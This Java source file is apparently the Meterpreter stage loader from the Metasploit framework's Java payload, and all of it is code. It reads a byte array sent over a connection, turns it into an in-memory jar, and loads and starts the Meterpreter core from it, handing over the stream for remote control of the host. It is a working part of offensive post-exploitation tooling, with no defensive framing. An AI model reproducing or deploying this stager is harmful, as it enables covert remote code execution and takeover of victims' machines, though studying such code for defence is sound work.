package javapayload.stage;

import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLClassLoader;

import com.metasploit.meterpreter.MemoryBufferURLConnection;

/**
 * Meterpreter Java Payload Proxy
 */
public class Meterpreter implements Stage {

	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		boolean noRedirectError = parameters[parameters.length-1].equals("NoRedirect");
		int coreLen = in.readInt();
		byte[] core = new byte[coreLen];
		in.readFully(core);
		URL coreURL = MemoryBufferURLConnection.createURL(core, "application/jar");
		new URLClassLoader(new URL[] { coreURL }, getClass().getClassLoader()).loadClass("com.metasploit.meterpreter.Meterpreter").getConstructor(new Class[] { DataInputStream.class, OutputStream.class, boolean.class, boolean.class }).newInstance(new Object[] { in, out, Boolean.TRUE, new Boolean(!noRedirectError) });
		in.close();
		out.close();
	}
}
